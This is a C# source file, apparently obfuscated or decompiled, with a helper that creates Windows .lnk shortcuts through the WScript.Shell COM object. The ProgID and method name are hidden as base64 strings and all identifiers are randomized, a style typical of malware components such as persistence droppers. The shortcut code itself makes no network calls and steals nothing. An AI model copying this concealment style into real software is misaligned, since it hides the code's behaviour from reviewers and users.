using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace LSMgrTguKYchoUzfqQ;

public class PsIsmnbGDcct
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface EGvaShKXQjZd
	{
		[DispId(0)]
		string DBxIwVPYPFS
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string gwVaXHzYWfP
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string tRusrxURiW
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string XdrsbSfjlHaOGmo
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string iGzRRjPQvlDko
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string wfkOtDwwAykU
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string HRDwtNSgrXhqQn
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int CnWwprLfVCVZzm
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string CBGGyvBeMzUOd
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(2000)]
		[TypeLibFunc(64)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type BRskJrIlxmrska = Type.GetTypeFromProgID(VSCOSikLsIYu.AKDOdYwKlSeS("V1NjcmlwdC5TaGVsbA=="));

	private static object GMDSwfVLgvINNmHmN = Activator.CreateInstance(BRskJrIlxmrska);

	public static void akrVUPwUXz(string DdkCFQGpjaxf, string SGQSvzVDCkUuFf, string duLdtFdNHAQBCn, string MzvEVtXUzXIpD, string NdoGhgpWjBUkkfwJv, string rCIFaRAuVxOPTy, string ExZiPmMbLRXq)
	{
		try
		{
			EGvaShKXQjZd eGvaShKXQjZd = (EGvaShKXQjZd)BRskJrIlxmrska.InvokeMember(VSCOSikLsIYu.AKDOdYwKlSeS("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, GMDSwfVLgvINNmHmN, new object[1] { DdkCFQGpjaxf });
			eGvaShKXQjZd.tRusrxURiW = NdoGhgpWjBUkkfwJv;
			eGvaShKXQjZd.XdrsbSfjlHaOGmo = rCIFaRAuVxOPTy;
			eGvaShKXQjZd.HRDwtNSgrXhqQn = SGQSvzVDCkUuFf;
			eGvaShKXQjZd.CBGGyvBeMzUOd = MzvEVtXUzXIpD;
			eGvaShKXQjZd.gwVaXHzYWfP = duLdtFdNHAQBCn;
			if (!string.IsNullOrEmpty(ExZiPmMbLRXq))
			{
				eGvaShKXQjZd.iGzRRjPQvlDko = ExZiPmMbLRXq;
			}
			eGvaShKXQjZd.Save();
		}
		catch (Exception ex)
		{
			if (VSCOSikLsIYu.nsUlKTEfYADHHkY)
			{
				try
				{
					File.AppendAllText(VSCOSikLsIYu.DQNgDvGHNxeJ, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
